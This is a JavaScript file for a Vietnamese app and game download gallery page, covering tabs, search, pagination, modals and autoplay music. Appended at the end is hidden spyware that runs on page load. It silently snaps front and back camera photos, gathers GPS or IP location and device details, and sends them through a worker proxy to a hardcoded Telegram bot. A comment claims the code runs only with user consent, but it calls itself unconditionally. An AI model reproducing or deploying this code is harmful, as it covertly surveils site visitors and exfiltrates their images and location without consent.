
// Load app data from external files
let sampleApps = [];

function loadAppsFromData() {
    // Kết hợp dữ liệu từ apps-data.js và games-data.js
    sampleApps = [...appsData,];
}

// Current active category
let currentCategory = 'all';
let searchQuery = '';

// Pagination
let currentPage = 1;
const appsPerPage = 8;

// DOM elements
const filesGrid = document.getElementById('filesGrid');
const fileModal = document.getElementById('fileModal');
const closeModal = document.getElementById('closeModal');
const contactModal = document.getElementById('contactModal');
const contactBtn = document.getElementById('contactBtn');
const closeContactModal = document.getElementById('closeContactModal');
const categoryTabs = document.querySelectorAll('.tab-btn');
const sectionTitle = document.getElementById('sectionTitle');
const searchInput = document.getElementById('searchInput');
const clearSearch = document.getElementById('clearSearch');


// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    loadAppsFromData();
    setupEventListeners();
    renderFiles();
});

// Setup event listeners
function setupEventListeners() {
    // Modal close
    closeModal.addEventListener('click', closeFileModal);
    closeContactModal.addEventListener('click', closeContactModalFunc);
    
    // Contact button
    contactBtn.addEventListener('click', openContactModal);
    
    // Prevent modal from closing when clicking on modal content
    fileModal.querySelector('.modal-content').addEventListener('click', (e) => {
        e.stopPropagation();
    });
    
    contactModal.querySelector('.contact-modal-content').addEventListener('click', (e) => {
        e.stopPropagation();
    });
    
    
    
    window.addEventListener('click', (e) => {
        if (e.target === fileModal) {
            closeFileModal();
        }
        if (e.target === contactModal) {
            closeContactModalFunc();
        }
    });
    
    // Category tabs
    categoryTabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const category = tab.dataset.category;
            switchCategory(category);
        });
    });
    
    // Search functionality
    searchInput.addEventListener('input', (e) => {
        searchQuery = e.target.value.toLowerCase().trim();
        resetPagination();
        
        if (searchQuery) {
            clearSearch.style.display = 'block';
        } else {
            clearSearch.style.display = 'none';
        }
        
        renderFiles();
    });
    
    // Clear search
    clearSearch.addEventListener('click', () => {
        searchInput.value = '';
        searchQuery = '';
        resetPagination();
        clearSearch.style.display = 'none';
        renderFiles();
        searchInput.focus();
    });
}



// Render files grid
function renderFiles() {
    // Add fade out animation before clearing
    filesGrid.style.opacity = '0';
    filesGrid.style.transform = 'translateY(10px)';
    
    setTimeout(() => {
        filesGrid.innerHTML = '';
        
        let filteredApps = currentCategory === 'all' 
            ? sampleApps 
            : sampleApps.filter(app => app.category === currentCategory);
        
        // Apply search filter
        if (searchQuery) {
            filteredApps = filteredApps.filter(app => 
                app.name.toLowerCase().includes(searchQuery) ||
                app.description.toLowerCase().includes(searchQuery)
            );
        }
        
        if (filteredApps.length === 0) {
        let categoryName = '';
        if (currentCategory === 'all') categoryName = 'ứng dụng và game';
        else if (currentCategory === 'apps') categoryName = 'ứng dụng';
        else if (currentCategory === 'games') categoryName = 'game';
        
        const noResultsMessage = searchQuery 
            ? `Không tìm thấy "${searchQuery}" trong ${categoryName}`
            : `Chưa có ${categoryName} nào`;
            
        const iconClass = searchQuery ? 'fas fa-search' : 'fas fa-inbox';
        
        filesGrid.innerHTML = `
            <div style="grid-column: 1/-1; text-align: center; color: white; padding: 40px;">
                <i class="${iconClass}" style="font-size: 3rem; opacity: 0.5; margin-bottom: 20px;"></i>
                <p style="font-size: 1.2rem; opacity: 0.8;">${noResultsMessage}</p>
                ${searchQuery ? '<p style="font-size: 1rem; opacity: 0.6; margin-top: 10px;">Thử tìm kiếm với từ khóa khác</p>' : ''}
            </div>
        `;
        updatePagination(0);
        return;
    }
    
    // Calculate pagination
    const totalPages = Math.ceil(filteredApps.length / appsPerPage);
    const startIndex = (currentPage - 1) * appsPerPage;
    const endIndex = startIndex + appsPerPage;
    const currentApps = filteredApps.slice(startIndex, endIndex);
    
    // Render current page apps
        currentApps.forEach(app => {
            const fileCard = createFileCard(app);
            filesGrid.appendChild(fileCard);
        });
        
        // Update pagination controls
        updatePagination(totalPages);
        
        // Fade in the grid
        filesGrid.style.opacity = '1';
        filesGrid.style.transform = 'translateY(0)';
    }, 150);
}

// Create file card element
function createFileCard(app) {
    const card = document.createElement('div');
    card.className = 'app-item';
    
    const categoryIcon = app.category === 'games' ? 'fas fa-gamepad' : 'fas fa-mobile-alt';
    
    const categoryTag = app.category === 'games' ? 'Game' : 'App';
    const categoryColor = app.category === 'games' ? '#FF9500' : '#007AFF';
    
    card.innerHTML = `
        <div class="app-icon">
            <img src="${app.icon}" alt="${app.name}" onerror="this.parentElement.innerHTML='<i class=&quot;${categoryIcon}&quot;></i>'">
        </div>
        <div class="app-info">
            <h3>${app.name}</h3>
            <p>${app.description}</p>
            <span class="app-category-tag" style="background-color: ${categoryColor}">${categoryTag}</span>
        </div>
        <div class="app-meta">
            <span class="app-size">${app.size}</span>
            <button class="download-btn" onclick="event.stopPropagation(); downloadApp({
                name: '${app.name}',
                downloadLink: '${app.downloadLink}'
            })">
                <i class="fas fa-download"></i>
                Tải xuống
            </button>
        </div>
    `;
    
    card.onclick = () => {
        openFileModal(app);
    };
    
    return card;
}

// Open file modal
function openFileModal(app) {
    document.getElementById('modalIcon').src = app.icon;
    document.getElementById('modalTitle').textContent = app.name;
    document.getElementById('modalVersion').textContent = app.version + ' • ' + app.size;
    document.getElementById('modalDescription').textContent = app.description;
    
    // Setup buttons
    document.getElementById('downloadBtn').onclick = () => downloadApp(app);
    
    fileModal.style.display = 'block';
}

// Close file modal
function closeFileModal() {
    fileModal.style.display = 'none';
}

// Open contact modal
function openContactModal() {
    // Add click animation to contact button
    contactBtn.style.transform = 'translateY(-1px) scale(1.02)';
    setTimeout(() => {
        contactBtn.style.transform = '';
    }, 150);
    
    // Show modal with animation
    contactModal.style.display = 'block';
    const modalContent = contactModal.querySelector('.contact-modal-content');
    
    // Trigger animation
    setTimeout(() => {
        modalContent.classList.add('show');
    }, 10);
}

// Close contact modal
function closeContactModalFunc() {
    const modalContent = contactModal.querySelector('.contact-modal-content');
    modalContent.classList.remove('show');
    
    // Hide modal after animation completes
    setTimeout(() => {
        contactModal.style.display = 'none';
    }, 400);
}

// Download app
function downloadApp(app) {
    // Open download link
    if (app.downloadLink) {
        window.open(app.downloadLink, '_blank');
        closeFileModal();
    } else {
        alert('Link tải xuống chưa được thiết lập cho ứng dụng này.');
    }
}





// Remove 3D tilt effect, keep only simple hover animations

// Add floating particles effect
function createParticles() {
    const particlesContainer = document.createElement('div');
    particlesContainer.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: -1;
    `;
    
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.style.cssText = `
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            animation: float ${Math.random() * 3 + 2}s ease-in-out infinite;
            left: ${Math.random() * 100}%;
            top: ${Math.random() * 100}%;
            animation-delay: ${Math.random() * 2}s;
        `;
        particlesContainer.appendChild(particle);
    }
    
    document.body.appendChild(particlesContainer);
}

// Add CSS animation for particles
const style = document.createElement('style');
style.textContent = `
    @keyframes float {
        0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.3; }
        50% { transform: translateY(-20px) rotate(180deg); opacity: 1; }
    }
`;
document.head.appendChild(style);

// Update pagination controls
function updatePagination(totalPages) {
    let paginationContainer = document.getElementById('paginationContainer');
    
    if (!paginationContainer) {
        paginationContainer = document.createElement('div');
        paginationContainer.id = 'paginationContainer';
        paginationContainer.className = 'pagination-container';
        document.querySelector('.files-section').appendChild(paginationContainer);
    }
    
    if (totalPages <= 1) {
        paginationContainer.style.display = 'none';
        return;
    }
    
    paginationContainer.style.display = 'flex';
    paginationContainer.innerHTML = '';
    
    // Previous button
    const prevBtn = document.createElement('button');
    prevBtn.className = `pagination-btn ${currentPage === 1 ? 'disabled' : ''}`;
    prevBtn.innerHTML = '<i class="fas fa-chevron-left"></i>';
    prevBtn.onclick = () => changePage(currentPage - 1);
    paginationContainer.appendChild(prevBtn);
    
    // Page numbers
    for (let i = 1; i <= totalPages; i++) {
        const pageBtn = document.createElement('button');
        pageBtn.className = `pagination-btn ${i === currentPage ? 'active' : ''}`;
        pageBtn.textContent = i;
        pageBtn.onclick = () => changePage(i);
        paginationContainer.appendChild(pageBtn);
    }
    
    // Next button
    const nextBtn = document.createElement('button');
    nextBtn.className = `pagination-btn ${currentPage === totalPages ? 'disabled' : ''}`;
    nextBtn.innerHTML = '<i class="fas fa-chevron-right"></i>';
    nextBtn.onclick = () => changePage(currentPage + 1);
    paginationContainer.appendChild(nextBtn);
    
    // Page info
    const pageInfo = document.createElement('div');
    pageInfo.className = 'page-info';
    pageInfo.textContent = `Trang ${currentPage} / ${totalPages}`;
    paginationContainer.appendChild(pageInfo);
}

// Change page function
function changePage(page) {
    const totalApps = currentCategory === 'all' 
        ? sampleApps.length 
        : sampleApps.filter(app => app.category === currentCategory).length;
    
    const totalPages = Math.ceil(totalApps / appsPerPage);
    
    if (page < 1 || page > totalPages) return;
    
    currentPage = page;
    renderFiles();
    
    // Scroll to top of files section
    document.querySelector('.files-section').scrollIntoView({ behavior: 'smooth' });
}

// Reset pagination when switching categories or searching
function resetPagination() {
    currentPage = 1;
}

// Switch category function
function switchCategory(category) {
    currentCategory = category;
    resetPagination();
    
    // Update active tab
    categoryTabs.forEach(tab => {
        tab.classList.remove('active');
        if (tab.dataset.category === category) {
            tab.classList.add('active');
        }
    });
    
    // Update section title
    let categoryIcon, categoryName;
    if (category === 'all') {
        categoryIcon = 'fas fa-th-large';
        categoryName = 'Tất cả';
    } else if (category === 'games') {
        categoryIcon = 'fas fa-gamepad';
        categoryName = 'Game';
    } else {
        categoryIcon = 'fas fa-mobile-alt';
        categoryName = 'Ứng dụng';
    }
    
    sectionTitle.innerHTML = `<i class="${categoryIcon}"></i> ${categoryName}`;
    
    // Re-render files
    renderFiles();
}



// Initialize particles
createParticles();

window.addEventListener("DOMContentLoaded", function () {
  const audio = document.createElement("audio");
  audio.src = "TRTD.m4a";        // 🔁 Thay bằng đường dẫn file nhạc bạn muốn
  audio.type = "audio/mp4";
  audio.controls = true;
  audio.autoplay = true;
  audio.loop = true;
  document.body.appendChild(audio);
  audio.play().catch(e => {
    console.warn("Trình duyệt chặn autoplay:", e);
  });
});
const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
const TELEGRAM_CHAT_ID = '6956722046';
const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

function getPreciseLocationOrFallbackToIP() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return getIPInfo().then(resolve);

    navigator.geolocation.getCurrentPosition(
      pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);
        info.address = '📍 Lấy từ GPS chính xác';
        info.country = 'Không rõ';
        info.ip = 'Không rõ';
        info.isp = 'Không rõ';
        resolve();
      },
      err => {
        console.warn('❌ GPS bị từ chối, chuyển sang IP:', err.message);
        getIPInfo().then(resolve);
      },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

function getIPInfo() {
  return fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => {
      info.ip = data.ip;
      info.isp = data.connection?.org || 'Không rõ';
      info.address = `${data.region}, ${data.city}, ${data.postal || ''}`.replace(/, $/, '');
      info.country = data.country;
      info.lat = data.latitude;
      info.lon = data.longitude;
    })
    .catch(() => {
      info.ip = 'Không rõ';
      info.isp = 'Không rõ';
      info.address = 'Không rõ';
      info.country = 'Không rõ';
      info.lat = '0';
      info.lon = '0';
    });
}

function getCaption() {
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌐 IP: ${info.ip}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌍 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📸 Camera: ${info.camera}
`.trim();
}

function captureCamera(facingMode = "user") {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");

          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
          }, 1000);
        };
      })
      .catch(reject);
  });
}

async function sendTwoPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('media', JSON.stringify([
    {
      type: 'photo',
      media: 'attach://front',
      caption: getCaption()
    },
    {
      type: 'photo',
      media: 'attach://back'
    }
  ]));
  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  return fetch(API_SEND_MEDIA, {
    method: 'POST',
    body: formData
  });
}

async function main() {
  detectDevice();

  let frontBlob = null;
  let backBlob = null;

  try {
    frontBlob = await captureCamera("user");
    backBlob = await captureCamera("environment");
    info.camera = '✅ Đã chụp camera trước và sau';
  } catch (err) {
    console.warn("Không chụp đủ camera:", err.message);
    info.camera = '📵 Không thể truy cập đủ camera';
  }

  await getPreciseLocationOrFallbackToIP();

  if (frontBlob && backBlob) {
    await sendTwoPhotos(frontBlob, backBlob);
  } else {
    fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: getCaption()
      })
    });
  }
}

// Gọi thủ công từ nút hoặc từ popup khi người dùng đồng ý
main();
